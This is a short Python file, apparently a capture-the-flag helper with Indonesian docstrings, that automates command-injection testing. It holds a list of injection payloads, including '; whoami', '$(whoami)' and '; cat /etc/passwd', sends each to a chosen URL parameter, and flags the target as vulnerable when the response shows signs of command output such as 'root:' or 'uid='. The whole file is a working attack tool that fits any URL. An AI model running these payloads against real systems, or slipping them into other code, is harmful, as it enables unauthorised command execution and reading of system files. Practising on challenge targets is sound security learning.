import requests
import re

class RCESolver:
    """
    Command injection solver.
    Menyelesaikan challenge command injection.
    """
    
    def __init__(self):
        self.rce_payloads = [
            '; whoami',
            '| whoami',
            '& whoami',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd'
        ]
    
    def solve_rce_challenge(self, target_url: str, parameter: str):
        """
        Selesaikan challenge RCE.
        """
        results = {
            'target_url': target_url,
            'parameter': parameter,
            'vulnerable': False,
            'payload_used': None,
            'output_detected': False,
            'solution_found': False
        }
        
        try:
            for payload in self.rce_payloads:
                if self._test_rce_payload(target_url, parameter, payload):
                    results.update({
                        'vulnerable': True,
                        'payload_used': payload,
                        'output_detected': True,
                        'solution_found': True
                    })
                    break
        
        except Exception as e:
            results['error'] = f'RCE solving failed: {str(e)}'
        
        return results
    
    def _test_rce_payload(self, url: str, param: str, payload: str) -> bool:
        """Uji payload RCE."""
        try:
            response = requests.post(url, data={param: payload}, timeout=10)
            output_indicators = ['root:', 'www-data', '/bin/', 'uid=', 'gid=']
            return any(indicator in response.text for indicator in output_indicators)
        except:
            return False